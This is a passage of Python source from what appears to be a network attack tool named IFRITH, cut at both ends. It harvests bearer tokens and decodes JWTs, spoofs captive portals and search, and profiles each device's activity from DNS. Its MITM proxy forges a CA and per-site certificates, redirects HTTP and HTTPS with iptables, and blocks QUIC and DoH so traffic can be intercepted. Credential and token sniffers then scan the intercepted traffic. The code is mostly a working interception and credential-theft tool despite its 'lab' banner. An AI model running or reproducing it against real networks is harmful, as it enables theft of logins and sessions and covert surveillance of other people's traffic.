                tok = m.group(0).decode("utf-8", "ignore")
                if not tok: continue
                out.append(tok)
                with STATE.lock:
                    STATE.tokens.append((time.time(), host or src_ip,
                                          "harvested", tok[:400]))
                    STATE.dirty += 1
                jwt = _decode_jwt(tok)
                if jwt and JWT_WATCHER:
                    try: JWT_WATCHER.observe_jwt(host or src_ip, jwt)
                    except Exception: pass
        except Exception: pass
        return out

class CookieJarEngine:
    def __init__(self): self.running = False
    def start(self):
        self.running = True
        console.log("[green]Cookie jar engine online[/]")
        return True
    def stop(self): self.running = False

class JWTWatcher:
    def __init__(self): self.running = False
    def start(self):
        self.running = True
        console.log("[green]JWT watcher online[/]")
        return True
    def stop(self): self.running = False
    def observe_jwt(self, host, jwt):
        if not jwt: return
        with STATE.lock:
            sub = jwt.get("payload", {}).get("sub")
            if sub:
                STATE.correlations.append((time.time(), "jwt_sub",
                                            str(sub)[:40], (host,)))
            STATE.dirty += 1

class CaptiveHijack:
    def __init__(self, portal_port):
        self.running = False
        self.portal_port = portal_port
        self.triggers = (
            "connectivitycheck.", "captive.apple.", "clients3.google.",
            "msftconnecttest.", "detectportal.", "network-test.",
            "gstatic.com/generate_204", "connectivity-check.",
        )
    def start(self):
        self.running = True
        console.log("[green]Captive hijack online[/]")
        return True
    def stop(self): self.running = False
    def match(self, sni):
        if not sni: return False
        return any(t in sni.lower() for t in self.triggers)

class SearchSpoof:
    def __init__(self):
        self.running = False
        self.domains = set(SEARCH_HINTS)
    def start(self):
        self.running = True
        console.log(f"[green]Search spoof online ({len(self.domains)} hints)[/]")
        return True
    def stop(self): self.running = False
    def is_search(self, sni):
        if not sni: return False
        s = sni.lower()
        for d in self.domains:
            if d in s: return True
        return False

class HTTPServer:
    def __init__(self, host, port, portal_name="IFRITH Portal", html=None):
        self.host = host; self.port = port
        self.running = False; self.sock = None
        self.portal_name = portal_name
        self.html = html or self._default_html()
    def _default_html(self):
        return (f"<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
                f"<title>{self.portal_name}</title></head>"
                f"<body style=\"font-family:sans-serif;background:#111;"
                f"color:#eee;text-align:center;padding-top:80px\">"
                f"<h1>IFRITH Lab Portal</h1>"
                f"<p>This is a lab instrument. Traffic is captured for "
                f"educational analysis.</p></body></html>")
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(30); self.sock.settimeout(1.0)
        except Exception as e:
            console.log(f"[yellow]Portal bind failed: {e}[/]")
            return False
        self.running = True
        threading.Thread(target=self._loop, daemon=True).start()
        console.log(f"[green]Portal on {self.host}:{self.port}[/]")
        return True
    def stop(self):
        self.running = False
        try:
            if self.sock: self.sock.close()
        except Exception: pass
    def _loop(self):
        while self.running and STATE.running:
            try: conn, addr = self.sock.accept()
            except socket.timeout: continue
            except Exception: break
            try:
                conn.settimeout(2.0)
                data = b""
                try: data = conn.recv(8192)
                except Exception: pass
                with STATE.lock:
                    STATE.portal_hits.append((time.time(), addr[0], data[:200]))
                    STATE.captive_hits.append((time.time(), addr[0],
                                                "http", data[:100]))
                    STATE.dirty += 1
                body = self.html.encode()
                resp = (b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: text/html; charset=utf-8\r\n"
                        b"Content-Length: " + str(len(body)).encode()
                        + b"\r\n"
                        b"Cache-Control: no-store\r\n"
                        b"Connection: close\r\n\r\n" + body)
                conn.send(resp)
            except Exception: pass
            finally:
                try: conn.close()
                except Exception: pass

def handle_dns(data, src_ip, ts):
    try: dns = dpkt.dns.DNS(data)
    except Exception: return
    if dns.qr == 0 and dns.qd:
        for q in dns.qd:
            dom = q.name.rstrip(".").lower()
            qtype = {1:"A",28:"AAAA",5:"CNAME",15:"MX",
                     16:"TXT",12:"PTR",33:"SRV",65:"HTTPS",43:"DS",
                     48:"DNSKEY",64:"SVCB"}.get(q.type, str(q.type))
            dup = _dns_dedup_check(src_ip, dom)
            with STATE.lock:
                if not dup:
                    STATE.dns_events.append((ts, src_ip, dom, qtype, None))
                STATE.dirty += 1
                d = STATE.devices.get(src_ip)
                if d is None:
                    d = Device(src_ip, vendor="?")
                    STATE.devices[src_ip] = d
                d.dns.append((ts, dom, qtype))
                _bump_site(d, dom, CONFIG.get("per_device_sites_max", 150))
                app = domain_to_app(dom)
                if app: _bump_app(d, app, weight=1.0)
                if any(_hint_match(dom, [s]) for s in SEARCH_HINTS):
                    d.search_queries.append((ts, dom))
                    STATE.search_hits.append((ts, src_ip, dom))
            if DNSBL_ENGINE:
                try: DNSBL_ENGINE.observe(src_ip, dom, "dns")
                except Exception: pass
            if qtype == "TXT" and DNS_CHAN_EST:
                try: DNS_CHAN_EST.observe(src_ip, dom, len(data))
                except Exception: pass
    elif dns.qr == 1 and dns.qd:
        dom = dns.qd[0].name.rstrip(".").lower()
        answers = []
        for an in dns.an:
            try:
                if isinstance(an.rdata, bytes):
                    answers.append(socket.inet_ntoa(an.rdata))
                else:
                    answers.append(str(an.rdata))
            except Exception: pass
        with STATE.lock:
            STATE.dns_events.append((ts, src_ip, dom, "R",
                                      ",".join(answers[:4])))
            STATE.dirty += 1

def handle_mdns(data, src_ip, ts):
    try: dns = dpkt.dns.DNS(data)
    except Exception: return
    qnames = []
    try:
        for q in dns.qd: qnames.append(q.name.rstrip("."))
    except Exception: pass
    with STATE.lock:
        d = STATE.devices.get(src_ip)
        if d is None:
            d = Device(src_ip, vendor="?")
            STATE.devices[src_ip] = d
        d.services.add("mDNS")
        for dom in qnames:
            if not _dns_dedup_check(src_ip, dom):
                STATE.dns_events.append((ts, src_ip, dom, "mDNS", None))
            friendly = _mdns_friendly(dom)
            if friendly:
                _bump_app(d, friendly.replace(" (mDNS)", ""), weight=0.5)
        STATE.dirty += 1
    for dom in qnames:
        if DNSBL_ENGINE:
            try: DNSBL_ENGINE.observe(src_ip, dom, "mdns")
            except Exception: pass
    if WIFIDIRECT:
        for dom in qnames:
            if ("_wifi" in dom.lower() or "wfds" in dom.lower()
                or "_wfd" in dom.lower()):
                try:
                    WIFIDIRECT.lookup(dom)
                    with STATE.lock:
                        STATE.wifidirect_svc.append((time.time(), src_ip, dom))
                        STATE.dirty += 1
                except Exception: pass

def handle_ssdp(data, src_ip, ts):
    try: text = data.decode("utf-8", errors="ignore")
    except Exception: return
    m = re.search(r"NT:([^\r\n]+)", text) or re.search(r"ST:([^\r\n]+)", text)
    svc = m.group(1).strip()[:40] if m else None
    with STATE.lock:
        d = STATE.devices.get(src_ip)
        if d is None:
            d = Device(src_ip, vendor="?")
            STATE.devices[src_ip] = d
        d.services.add("SSDP")
        if svc: d.services.add(svc)
        STATE.dirty += 1

def handle_ntp(src_ip):
    with STATE.lock:
        d = STATE.devices.get(src_ip)
        if d is None:
            d = Device(src_ip, vendor="?")
            STATE.devices[src_ip] = d
        d.services.add("NTP")
        STATE.dirty += 1

def _stack_label(d):
    ja4 = list(d.ja4.values())[-1] if d.ja4 else ""
    ja4s = list(d.ja4s.values())[-1] if d.ja4s else ""
    ja4h = list(d.ja4h.values())[-1] if d.ja4h else ""
    ja4ssh = list(d.ja4ssh.values())[-1] if d.ja4ssh else ""
    if ja4ssh: return "[green]SSH client[/]"
    if ja4.startswith("q13"): return "[magenta]QUIC/TLS1.3[/]"
    if ja4.startswith("t13"): return "[cyan]TLS 1.3 client[/]"
    if ja4.startswith("t12"): return "[yellow]TLS 1.2 client[/]"
    if ja4h.startswith("ge2") or ja4h.startswith("po2"):
        return "[blue]HTTP/2[/]"
    if ja4h.startswith("ge1") or ja4h.startswith("po1"):
        return "[blue]HTTP/1.1[/]"
    if ja4s: return "[dim]TLS server[/]"
    if d.ja4x: return "[dim]X.509 stack[/]"
    if d.ja3:
        label = _JA3_DB.get(list(d.ja3.keys())[-1], (None, None))[0]
        if label: return f"[blue]{label}[/]"
        return f"[blue]JA3:{list(d.ja3.keys())[-1][:8]}[/]"
    if d.ua_bot: return "[red]script UA[/]"
    if d.ua_browser: return "[cyan]browser UA[/]"
    if d.dhcp_fp: return f"[dim]{d.dhcp_fp}[/]"
    return "[dim]unknown[/]"

def _best_site_for(device, window_s=None):
    if window_s is None: window_s = CONFIG.get("activity_window_s", 30) * 3
    now = time.time(); cutoff = now - window_s
    with STATE.lock:
        recent_dns = [(ts, dom) for ts, src, dom, q, ans in STATE.dns_events
                      if src == device.ip and ts >= cutoff]
        sites_items = list(device.sites.items())
        last_svc = device.last_svc
    for ts, dom in reversed(recent_dns):
        if dom.startswith("_"): continue
        if "._tcp" in dom or "._udp" in dom: continue
        if dom.endswith(".local"): continue
        return dom
    real = [(d, n) for d, n in sites_items
            if not d.startswith("_") and "._tcp" not in d
            and "._udp" not in d and not d.endswith(".local")]
    if real:
        real.sort(key=lambda kv: -kv[1]); return real[0][0]
    if last_svc and not last_svc.startswith("_"): return last_svc
    return None

def _device_rate(device, window_s=None):
    if window_s is None: window_s = CONFIG.get("activity_window_s", 30)
    now = time.time(); cutoff = now - window_s
    up = down = pkts = 0
    udp_pkts = udp_bytes = non_call_udp_pkts = 0
    call_port_seen = False; parallel = 0
    with STATE.lock: flows_snapshot = list(STATE.flows.items())
    for key, meta in flows_snapshot:
        s, sp, d, dp, proto = key
        if meta["last"] < cutoff: continue
        if s != device.ip and d != device.ip: continue
        parallel += 1
        if s == device.ip:
            up += meta["bytes"]; pkts += meta["pkts"]
            if proto == "UDP":
                udp_pkts += meta["pkts"]; udp_bytes += meta["bytes"]
                if dp in CALL_PORTS or sp in CALL_PORTS:
                    call_port_seen = True
                if dp in NON_CALL_UDP_PORTS or sp in NON_CALL_UDP_PORTS:
                    non_call_udp_pkts += meta["pkts"]
        elif d == device.ip:
            down += meta["bytes"]; pkts += meta["pkts"]
            if proto == "UDP":
                udp_pkts += meta["pkts"]; udp_bytes += meta["bytes"]
                if dp in CALL_PORTS or sp in CALL_PORTS:
                    call_port_seen = True
                if dp in NON_CALL_UDP_PORTS or sp in NON_CALL_UDP_PORTS:
                    non_call_udp_pkts += meta["pkts"]
    up_bps = up / window_s if window_s else 0
    down_bps = down / window_s if window_s else 0
    return (up_bps, down_bps, (up + down) / window_s, pkts, udp_pkts,
            udp_bytes, parallel, call_port_seen, non_call_udp_pkts)

def classify_activity(device, window_s=None):
    if window_s is None: window_s = CONFIG.get("activity_window_s", 30)
    now = time.time()
    (up_bps, down_bps, rate, pkts, udp_pkts, udp_bytes,
     parallel, call_port_seen, non_call_udp_pkts) = _device_rate(device,
                                                                  window_s)
    idle_for = now - device.last_seen
    if idle_for > 300: return ("(offline)", "[dim]offline[/]", 0.0)
    if idle_for > 60 and rate < 50:
        return ("(idle)", "[dim]idle[/]", rate)
    cutoff = now - window_s
    with STATE.lock:
        recent_dns = [(ts, dom) for ts, src, dom, q, ans in STATE.dns_events
                      if src == device.ip and ts >= cutoff]
        enc_dns = STATE.encrypted_dns.get(device.ip)
    pps = udp_pkts / window_s if window_s else 0
    avg_udp = (udp_bytes / udp_pkts) if udp_pkts else 0
    call_dom = _call_service_hint(recent_dns)
    hints = {
        "update": any(_hint_any(d, UPDATE_HINTS) for _, d in recent_dns),
        "audio": any(_hint_any(d, AUDIO_HINTS) for _, d in recent_dns),
        "video": any(_hint_any(d, VIDEO_HINTS) for _, d in recent_dns),
        "gaming": any(_hint_any(d, GAMING_HINTS) for _, d in recent_dns),
        "backup": any(_hint_any(d, BACKUP_HINTS) for _, d in recent_dns),
        "p2p": any(_hint_any(d, P2P_HINTS) for _, d in recent_dns),
        "msg": any(_hint_any(d, MSG_HINTS) for _, d in recent_dns),
        "telemetry": any(_hint_any(d, TELEMETRY_HINTS) for _, d in recent_dns),
        "cloud": any(_hint_any(d, CLOUD_SYNC_HINTS) for _, d in recent_dns),
        "vid_up": any(_hint_any(d, VIDEO_UPLOAD_HINTS) for _, d in recent_dns),
        "live": any(_hint_any(d, LIVE_STREAM_HINTS) for _, d in recent_dns),
        "email": any(_hint_any(d, EMAIL_HINTS) for _, d in recent_dns),
        "vpn": any(_hint_any(d, VPN_HINTS) for _, d in recent_dns),
        "voip": any(_hint_any(d, VOIP_APP_HINTS) for _, d in recent_dns),
        "fileshare": any(_hint_any(d, FILE_SHARE_HINTS) for _, d in recent_dns),
        "iot": any(_hint_any(d, IOT_HINTS) for _, d in recent_dns),
        "wificall": any(_hint_any(d, WIFI_CALL_HINTS) for _, d in recent_dns),
        "remote": any(_hint_any(d, REMOTE_HINTS) for _, d in recent_dns),
        "social": any(_hint_any(d, SOCIAL_HINTS) for _, d in recent_dns),
    }
    predominantly_quic = (non_call_udp_pkts >= max(1, udp_pkts - 5))
    call_shape = (udp_pkts > 20 and 15 <= pps <= 250
                  and 80 <= avg_udp <= 1400)
    is_call = (call_shape and (bool(call_dom) or call_port_seen)
               and not predominantly_quic)
    is_video_call = is_call and rate > 200_000
    is_voice_call = is_call and rate <= 200_000
    if is_video_call: label = "[magenta]video call[/]"
    elif is_voice_call: label = "[magenta]voice call[/]"
    elif hints["update"] and down_bps > 2_000_000:
        label = "[yellow]OS update[/]"
    elif hints["cloud"] and up_bps > 300_000:
        label = "[magenta]backup/sync[/]"
    elif hints["fileshare"] and rate > 100_000:
        label = "[magenta]file share[/]"
    elif hints["vpn"]: label = "[blue]vpn[/]"
    elif hints["p2p"] and parallel > 20: label = "[red]p2p[/]"
    elif hints["remote"] or 3389 in device.ports or 5900 in device.ports:
        label = "[cyan]remote desktop[/]"
    elif hints["email"] and rate < 200_000: label = "[yellow]email[/]"
    elif hints["msg"] and rate < 200_000: label = "[green]messaging[/]"
    elif hints["wificall"]: label = "[magenta]wifi calling[/]"
    elif hints["voip"] and rate < 100_000: label = "[green]voip[/]"
    elif hints["iot"] and rate < 20_000: label = "[dim]iot[/]"
    elif hints["vid_up"] and up_bps > 200_000: label = "[cyan]video up[/]"
    elif hints["live"] and rate > 200_000: label = "[red]live stream[/]"
    elif hints["gaming"] or (udp_pkts > 30 and pps > 15 and avg_udp < 300
                             and not call_port_seen and not call_dom):
        label = "[blue]gaming[/]"
    elif hints["audio"] and 15_000 < rate < 200_000 and not hints["video"]:
        label = "[green]audio[/]"
    elif hints["video"] and rate > 300_000: label = "[yellow]video[/]"
    elif down_bps > 1_000_000 and up_bps < 100_000:
        label = "[cyan]download[/]"
    elif up_bps > 500_000 and down_bps < 100_000:
        label = "[magenta]upload[/]"
    elif hints["telemetry"] and rate < 10_000: label = "[red]telemetry[/]"
    elif recent_dns and len(recent_dns) > 20 and rate < 5_000:
        label = "[red]telemetry[/]"
    elif hints["social"] and rate < 500_000: label = "[green]social[/]"
    elif rate > 50_000: label = "[cyan]browse[/]"
    elif rate > 5_000: label = "[dim]active[/]"
    elif rate > 0: label = "[dim]light[/]"
    else: label = "[dim]idle[/]"
    top_apps = _top_apps(device, n=2)
    site_display = None
    if top_apps: site_display = top_apps[0][0]
    if not site_display: site_display = _best_site_for(device)
    if is_call and call_dom: site_display = call_dom
    if not site_display and enc_dns:
        site_display = f"{enc_dns} (encrypted)"
    sticky_s = CONFIG.get("sticky_activity_s", 8)
    if (label not in ("[dim]idle[/]", "[dim]active[/]", "[dim]light[/]")
        or not device.last_label):
        device.last_label = label
        device.last_label_ts = now
        if site_display: device.last_svc = site_display
    else:
        if (now - device.last_label_ts) < sticky_s and device.last_label:
            label = device.last_label
            if not site_display and device.last_svc:
                site_display = device.last_svc
    return (site_display or "(no dns)", label, rate)

def _hint_any(dom, hints):
    return bool(dom) and any(h in dom.lower() for h in hints)

def _hint_match(dom, hints):
    return bool(dom) and any(h in dom.lower() for h in hints)

def _call_service_hint(recent_dns):
    for ts, dom in reversed(recent_dns):
        if _hint_match(dom, CALL_HINTS): return dom
    return None

def _is_me(ip):
    return ip == CONFIG.get("my_ip") and CONFIG.get("my_ip") is not None
def _is_gw(ip):
    return ip == CONFIG.get("gateway_ip") and CONFIG.get("gateway_ip") is not None
def _is_mcast(ip):
    return ip.startswith(("224.", "239.")) or ip.lower().startswith("ff02:")
def _is_bcast(ip): return ip == "255.255.255.255"

def role_of(ip):
    if _is_me(ip): return "[bold green]YOU[/]"
    if _is_gw(ip): return "[bold yellow]ROUTER[/]"
    if _is_mcast(ip): return "[dim]MCAST[/]"
    if _is_bcast(ip): return "[dim]BCAST[/]"
    if ip in RESOLVER_IPS: return "[dim]DNS[/]"
    return "[cyan]DEV[/]"

def role_of_short(ip):
    if _is_me(ip): return "[bold green]U[/]"
    if _is_gw(ip): return "[bold yellow]R[/]"
    if _is_mcast(ip): return "[dim]M[/]"
    if _is_bcast(ip): return "[dim]B[/]"
    if ip in RESOLVER_IPS: return "[dim]D[/]"
    return "[cyan]D[/]"

def _display_ip(ip, short=False):
    mapped, is_mapped = _resolve_ip_for_display(ip)
    disp = mapped if is_mapped else ip
    tag = "[bold green]YOU[/]" if _is_me(ip) else \
          "[bold yellow]GW[/]" if _is_gw(ip) else \
          "[dim]MCAST[/]" if _is_mcast(ip) else \
          "[dim]BCAST[/]" if _is_bcast(ip) else \
          "[dim]DNS[/]" if ip in RESOLVER_IPS else "[cyan]DEV[/]"
    if short:
        tag = (tag.replace("YOU","U").replace("GW","R").replace("MCAST","M")
                  .replace("BCAST","B").replace("DEV","D").replace("DNS","D"))
    return f"{tag} {disp}"

def _tagged_ip(ip, short=False): return _display_ip(ip, short=short)

def dir_of(src, dst):
    if _is_me(src): return "[green]YOU>NET[/]"
    if _is_me(dst): return "[blue]NET>YOU[/]"
    if _is_gw(src): return "[yellow]GW>DEV[/]"
    if _is_gw(dst): return "[yellow]DEV>GW[/]"
    return "[magenta]DEV<->DEV[/]"

def _fmt_age(seconds):
    s = int(seconds)
    if s < 60: return f"{s}s"
    if s < 3600: return f"{s//60}m"
    return f"{s//3600}h"

class MITMProxy:
    def __init__(self, iface, my_ip, my_mac, gateway_ip, gateway_mac):
        self.iface = iface
        self.my_ip = my_ip
        self.my_mac = my_mac
        self.gw_ip = gateway_ip
        self.gw_mac = gateway_mac
        self.running = False
        self.http_listener = None
        self.https_listener = None
        self.http_port = CONFIG.get("proxy_http_port", 8880)
        self.https_port = CONFIG.get("proxy_https_port", 8443)
        self.original_http_port = CONFIG.get("proxy_original_port_http", 80)
        self.original_https_port = CONFIG.get("proxy_original_port_https", 443)
        self._lock = threading.RLock()
        self._iptables_rules = []
        self._active_flows = {}
        self._flow_counter = 0
        self._ca_key = None
        self._ca_cert = None
        self._leaf_cache = {}
        self._leaf_lock = threading.RLock()
        self._pinned_snis = {}
        self._pin_lock = threading.RLock()
        os.makedirs(CONFIG["auto_ca_dir"], exist_ok=True)

    def _gen_ca(self):
        try:
            key_path = os.path.join(CONFIG["auto_ca_dir"], "ca.key")
            cert_path = os.path.join(CONFIG["auto_ca_dir"], "ca.crt")
            if not os.path.exists(key_path) or not os.path.exists(cert_path):
                sh(f"openssl req -x509 -newkey rsa:2048 -nodes "
                   f"-keyout {key_path} -out {cert_path} -days 3650 "
                   f"-subj '/CN=IFRITH-LAB-CA' 2>/dev/null")
            self._ca_key = key_path
            self._ca_cert = cert_path
            return os.path.exists(key_path) and os.path.exists(cert_path)
        except Exception: return False

    def _mint_leaf(self, sni):
        with self._leaf_lock:
            if sni in self._leaf_cache:
                return self._leaf_cache[sni]
            try:
                safe = re.sub(r"[^A-Za-z0-9._-]", "_", sni)[:200]
                leaf_key = os.path.join(CONFIG["auto_ca_dir"], f"{safe}.key")
                leaf_csr = os.path.join(CONFIG["auto_ca_dir"], f"{safe}.csr")
                leaf_crt = os.path.join(CONFIG["auto_ca_dir"], f"{safe}.crt")
                if not os.path.exists(leaf_crt) or not os.path.exists(leaf_key):
                    sh(f"openssl req -new -newkey rsa:2048 -nodes "
                       f"-keyout {leaf_key} -out {leaf_csr} "
                       f"-subj '/CN={safe}' 2>/dev/null")
                    ext_file = leaf_csr + ".ext"
                    with open(ext_file, "w") as f:
                        f.write(f"subjectAltName=DNS:{sni}\n")
                    sh(f"openssl x509 -req -in {leaf_csr} "
                       f"-CA {self._ca_cert} -CAkey {self._ca_key} "
                       f"-CAcreateserial -out {leaf_crt} -days 365 "
                       f"-extfile {ext_file} 2>/dev/null")
                if os.path.exists(leaf_crt) and os.path.exists(leaf_key):
                    self._leaf_cache[sni] = (leaf_key, leaf_crt)
                    return leaf_key, leaf_crt
                return None, None
            except Exception: return None, None

    def _nat_rules(self):
        rules = []
        if CONFIG.get("proxy_nat_http"):
            rules.append((f"nat PREROUTING -i {self.iface} -p tcp "
                          f"--dport {self.original_http_port} "
                          f"-j REDIRECT --to-port {self.http_port}",
                          f"REDIRECT :{self.original_http_port} "
                          f"-> :{self.http_port}"))
        if CONFIG.get("proxy_nat_https"):
            rules.append((f"nat PREROUTING -i {self.iface} -p tcp "
                          f"--dport {self.original_https_port} "
                          f"-j REDIRECT --to-port {self.https_port}",
                          f"REDIRECT :{self.original_https_port} "
                          f"-> :{self.https_port}"))
        if CONFIG.get("mitm_quic_block"):
            rules.append((f"FORWARD -i {self.iface} -p udp --dport 443 -j DROP",
                          "DROP UDP/443 (force QUIC->TCP)"))
        if CONFIG.get("mitm_doh_block"):
            for ip in DOH_BLOCK_IPS[:40]:
                rules.append((f"FORWARD -i {self.iface} -d {ip} -p udp "
                              f"--dport 443 -j DROP",
                              f"DROP DoH UDP -> {ip}"))
                rules.append((f"FORWARD -i {self.iface} -d {ip} -p tcp "
                              f"--dport 853 -j DROP",
                              f"DROP DoT TCP -> {ip}"))
        return rules

    def _install_nat(self):
        if not sh("which iptables"):
            with STATE.lock:
                STATE.mitm_errors.append((time.time(), "iptables not found"))
            return False
        installed = 0
        for spec, label in self._nat_rules():
            table = "-t nat " if spec.startswith("nat ") else ""
            actual = spec[4:] if spec.startswith("nat ") else spec
            try:
                if table:
                    r = sh(f"iptables -t nat -C {actual} 2>/dev/null; echo $?")
                else:
                    r = sh(f"iptables -C {actual} 2>/dev/null; echo $?")
                if r.strip() != "0":
                    if table:
                        sh(f"iptables -t nat -I {actual}")
                    else:
                        sh(f"iptables -I {actual}")
                    self._iptables_rules.append((table, actual))
                    installed += 1
            except Exception as e:
                with STATE.lock:
                    STATE.mitm_errors.append((time.time(),
                        f"rule err {label}: {e}"))
        return installed

    def _remove_nat(self):
        for table, spec in self._iptables_rules:
            try:
                if table:
                    sh(f"iptables -t nat -D {spec} 2>/dev/null")
                else:
                    sh(f"iptables -D {spec} 2>/dev/null")
            except Exception: pass
        self._iptables_rules = []

    def _original_dst(self, sock):
        try:
            SO_ORIGINAL_DST = 80
            dst = sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
            port = struct.unpack("!H", dst[2:4])[0]
            ip = socket.inet_ntoa(dst[4:8])
            return ip, port
        except Exception:
            return None, None

    def _http_loop(self):
        while self.running and STATE.running:
            try: cli, addr = self.http_listener.accept()
            except socket.timeout: continue
            except Exception: break
            threading.Thread(target=self._handle_http, args=(cli, addr),
                             daemon=True).start()

    def _handle_http(self, cli, addr):
        flow_id = None
        try:
            cli.settimeout(CONFIG.get("proxy_upstream_timeout_s", 30.0))
            orig_ip, orig_port = self._original_dst(cli)
            req_data = b""
            cli.settimeout(5.0)
            try:
                while b"\r\n\r\n" not in req_data and len(req_data) < 65536:
                    chunk = cli.recv(8192)
                    if not chunk: break
                    req_data += chunk
            except socket.timeout: pass
            if not req_data:
                cli.close(); return
            hdr_end = req_data.find(b"\r\n\r\n")
            if hdr_end < 0:
                cli.close(); return
            head = req_data[:hdr_end].decode("latin-1", "replace")
            lines = head.split("\r\n")
            if not lines:
                cli.close(); return
            parts = lines[0].split(" ")
            if len(parts) < 3:
                cli.close(); return
            method, path, version = parts[0], parts[1], parts[2]
            headers = OrderedDict()
            for ln in lines[1:]:
                if ":" in ln:
                    k, v = ln.split(":", 1)
                    headers[k.strip()] = v.strip()
            host_hdr = headers.get("Host", headers.get("host", ""))
            target_host = host_hdr.split(":")[0] if host_hdr else (orig_ip or "")
            target_port = orig_port or 80
            if host_hdr and ":" in host_hdr:
                try: target_port = int(host_hdr.split(":")[1])
                except Exception: pass
            if not target_host:
                cli.close(); return
            clen = int(headers.get("Content-Length",
                                    headers.get("content-length", "0")) or 0)
            body_so_far = req_data[hdr_end + 4:]
            while len(body_so_far) < clen:
                try:
                    chunk = cli.recv(8192)
                    if not chunk: break
                    body_so_far += chunk
                except socket.timeout: break
            body = body_so_far[:clen]
            with self._lock:
                self._flow_counter += 1
                flow_id = self._flow_counter
                self._active_flows[flow_id] = {
                    "ts": time.time(), "src": addr[0], "sport": addr[1],
                    "dst": target_host, "dport": target_port,
                    "proto": "HTTP", "mode": "http", "outcome": "active",
                    "method": method, "path": path,
                    "bytes_in": len(req_data), "bytes_out": 0,
                }
            key = (addr[0], addr[1], target_host, target_port)
            if HTTP_PARSER:
                HTTP_PARSER.feed(key, "req", req_data)
            if CRED_SNIFF:
                try: CRED_SNIFF.scan(body, addr[0], target_host)
                except Exception: pass
            if TOKEN_HARVEST:
                try: TOKEN_HARVEST.scan(req_data, addr[0], target_host)
                except Exception: pass
            try:
                upstream = socket.create_connection((target_host, target_port),
                                                     timeout=10)
            except Exception as e:
                with STATE.lock:
                    STATE.mitm_errors.append((time.time(),
                        f"upstream fail {target_host}:{target_port}: {e}"))
                    STATE.proxy_stats["errors"] += 1
                try:
                    cli.send(b"HTTP/1.1 502 Bad Gateway\r\n"
                             b"Content-Length: 0\r\n\r\n")
                except Exception: pass
                cli.close(); return
            upstream.settimeout(CONFIG.get("proxy_upstream_timeout_s", 30.0))
            try:
                upstream.sendall(req_data)
            except Exception:
                try: upstream.close()
                except Exception: pass
                cli.close(); return
            cli.settimeout(1.0)
            upstream.settimeout(1.0)
            resp_bytes = 0
            while True:
                try:
                    ready, _, _ = select.select([cli, upstream], [], [], 1.0)
                except Exception: break
                if not ready: continue
                done = False
                for s in ready:
                    try:
                        chunk = s.recv(CONFIG.get("proxy_buffer_size", 65536))
                    except Exception:
                        done = True; break
                    if not chunk:
                        done = True; break
                    if s is cli:
                        try: upstream.sendall(chunk)
                        except Exception:
                            done = True; break
                        with self._lock:
                            if flow_id in self._active_flows:
                                self._active_flows[flow_id]["bytes_in"] += \
                                    len(chunk)
                        if HTTP_PARSER:
                            HTTP_PARSER.feed(key, "req", chunk)
                    else:
                        resp_bytes += len(chunk)
                        try: cli.sendall(chunk)
                        except Exception:
                            done = True; break
                        with self._lock:
                            if flow_id in self._active_flows:
                                self._active_flows[flow_id]["bytes_out"] += \
                                    len(chunk)
                        if HTTP_PARSER:
                            HTTP_PARSER.feed(key, "resp", chunk)
                        if CRED_SNIFF:
                            try: CRED_SNIFF.scan(chunk, addr[0], target_host)
                            except Exception: pass
                        if TOKEN_HARVEST:
                            try:
                                TOKEN_HARVEST.scan(chunk, addr[0], target_host)
                            except Exception: pass
                if done: break
            try: upstream.close()
            except Exception: pass
            try: cli.close()
            except Exception: pass
            with STATE.lock:
                STATE.proxy_stats["http"] += 1
                STATE.proxy_stats["bytes_in"] += len(req_data)
                STATE.proxy_stats["bytes_out"] += resp_bytes
                STATE.proxy_stats["active"] = len(self._active_flows)
                d = STATE.devices.get(addr[0])
                if d:
                    d.proxy_http_flows += 1
                    d.proxy_bytes_in += len(req_data)
                    d.proxy_bytes_out += resp_bytes
            with self._lock:
                if flow_id in self._active_flows:
                    rec = self._active_flows.pop(flow_id)
                    with STATE.lock:
                        STATE.mitm_flows.append((
                            rec["ts"], rec["src"], rec["dst"], rec["sport"],
                            rec["dport"], rec["proto"], None, target_host,
                            method, path, 200,
                            rec["bytes_in"], rec["bytes_out"],
                            "http", "done"))
                        STATE.proxy_flows.append(rec)
        except Exception as e:
            with STATE.lock:
                STATE.mitm_errors.append((time.time(), f"http handler: {e}"))
                STATE.proxy_stats["errors"] += 1
            try: cli.close()
            except Exception: pass

    def _https_loop(self):
        while self.running and STATE.running:
            try: cli, addr = self.https_listener.accept()
            except socket.timeout: continue
            except Exception: break
            threading.Thread(target=self._handle_https, args=(cli, addr),
                             daemon=True).start()

    def _handle_https(self, cli, addr):
        flow_id = None
        try:
            cli.settimeout(8.0)
            peek = b""
            try:
                cli.setblocking(False)
                t0 = time.time()
                while time.time() - t0 < 4.0 and len(peek) < 8192:
                    try:
                        chunk = cli.recv(8192, socket.MSG_PEEK)
                        if chunk:
                            peek = chunk
                            break
                    except BlockingIOError: time.sleep(0.05)
                    except Exception: break
            except Exception: pass
            finally:
                try: cli.setblocking(True)
                except Exception: pass
            if not peek or peek[0:1] != b"\x16":
                try: cli.close()
                except Exception: pass
                return
            info = _parse_client_hello_py(peek)
            sni = info.get("sni")
            orig_ip, orig_port = self._original_dst(cli)
            if not sni:
                sni = orig_ip
            if not sni:
                try: cli.close()
                except Exception: pass
                return
            with self._pin_lock:
                pin_hit = self._pinned_snis.get(sni)
            if pin_hit:
                with STATE.lock:
                    STATE.proxy_stats["pinned"] += 1
                    STATE.mitm_pins.append((time.time(), addr[0], sni,
                                             "known-pinned"))
                    d = STATE.devices.get(addr[0])
                    if d: d.proxy_pinned += 1
                try: cli.close()
                except Exception: pass
                return
            leaf_key, leaf_crt = self._mint_leaf(sni)
            if not leaf_key or not leaf_crt:
                try: cli.close()
                except Exception: pass
                return
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(leaf_crt, leaf_key)
                tls_cli = ctx.wrap_socket(cli, server_side=True)
            except ssl.SSLError as e:
                msg = str(e).lower()
                if ("alert" in msg or "certificate" in msg
                    or "unknown ca" in msg):
                    with self._pin_lock:
                        self._pinned_snis[sni] = time.time()
                    with STATE.lock:
                        STATE.proxy_stats["pinned"] += 1
                        STATE.mitm_pins.append((time.time(), addr[0], sni,
